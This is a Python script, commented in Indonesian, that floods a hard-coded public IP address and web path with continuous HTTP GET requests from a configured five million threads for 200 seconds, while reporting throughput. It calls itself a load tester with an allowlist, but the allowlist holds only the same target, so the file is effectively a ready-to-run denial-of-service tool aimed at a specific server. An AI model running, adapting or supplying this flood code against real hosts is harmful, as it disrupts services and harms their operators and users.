#!/usr/bin/env python3
"""
Parallel TCP HTTP requester:
- Beberapa thread jalan bersamaan (paralel)
- Masing-masing loop kirim HTTP GET terus-menerus selama durasi
- Ada ALLOWLIST untuk IP publik (mencegah target sembarangan)
- Gunakan hanya untuk host/domain yang kamu miliki/berizin
"""

import socket, threading, time, ipaddress, sys

# ===== Default config =====
TARGET_IP    = "139.99.61.184"   # target server
TARGET_PORT  = 80
PATH         = "/~bansosrz7/"
THREADS      = 5000000                # jumlah thread paralel
DURATION_SEC = 200                # lama pengujian
TIMEOUT_S    = 20

ALLOWLIST = {"139.99.61.184"}    # IP publik yang diizinkan

stop_evt = threading.Event()
ok_count = [0] * THREADS
err_count = [0] * THREADS
bytes_count = [0] * THREADS
locks = [threading.Lock() for _ in range(THREADS)]

def is_public(ip_str):
    ip = ipaddress.ip_address(ip_str)
    return not (ip.is_private or ip.is_loopback or ip.is_link_local)

def ensure_allowed(ip_str):
    if is_public(ip_str) and ip_str not in ALLOWLIST:
        print(f"[STOP] Target {ip_str} bukan di ALLOWLIST.")
        sys.exit(1)

def make_request():
    req = (
        f"GET {PATH} HTTP/1.1\r\n"
        f"Host: {TARGET_IP}\r\n"
        f"User-Agent: parallel-tcp-client/1.0\r\n"
        f"Accept: */*\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode("ascii")
    with socket.create_connection((TARGET_IP, TARGET_PORT), timeout=TIMEOUT_S) as s:
        s.sendall(req)
        total = 0
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            total += len(chunk)
        return total

def worker(idx, end_ts):
    while not stop_evt.is_set() and time.time() < end_ts:
        try:
            n = make_request()
            with locks[idx]:
                ok_count[idx] += 1
                bytes_count[idx] += n
        except Exception:
            with locks[idx]:
                err_count[idx] += 1

def reporter(end_ts):
    last = time.perf_counter()
    prev_bytes = 0
    while not stop_evt.is_set():
        now = time.perf_counter()
        if now - last >= 1.0:
            last = now
            tot_ok = sum(ok_count)
            tot_err = sum(err_count)
            tot_bytes = sum(bytes_count)
            inst_bytes = tot_bytes - prev_bytes
            prev_bytes = tot_bytes
            mbps = (inst_bytes * 8) / 1e6
            ts = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())
            print(f"{ts} | OK={tot_ok} ERR={tot_err} | IN≈{mbps:7.2f} Mbps | total={tot_bytes/1e6:,.2f} MB")
        if time.time() >= end_ts:
            break
        time.sleep(0.05)

def main():
    ensure_allowed(TARGET_IP)
    end_ts = time.time() + DURATION_SEC
    print(f"Parallel TCP requester -> {TARGET_IP}:{TARGET_PORT}{PATH}")
    print(f"Threads={THREADS} | Duration={DURATION_SEC}s")

    rep = threading.Thread(target=reporter, args=(end_ts,), daemon=True)
    rep.start()

    threads = []
    for i in range(THREADS):
        t = threading.Thread(target=worker, args=(i, end_ts), daemon=True)
        t.start()
        threads.append(t)

    try:
        while time.time() < end_ts:
            time.sleep(0.2)
    except KeyboardInterrupt:
        print("Stopping early...")
    finally:
        stop_evt.set()
        for t in threads:
            t.join(timeout=1.0)
        total_ok = sum(ok_count)
        total_err = sum(err_count)
        total_bytes = sum(bytes_count)
        print(f"Done. OK={total_ok} ERR={total_err} Bytes={total_bytes} ({total_bytes*8/1e6:.2f} Mbit)")

if __name__ == "__main__":
    main()
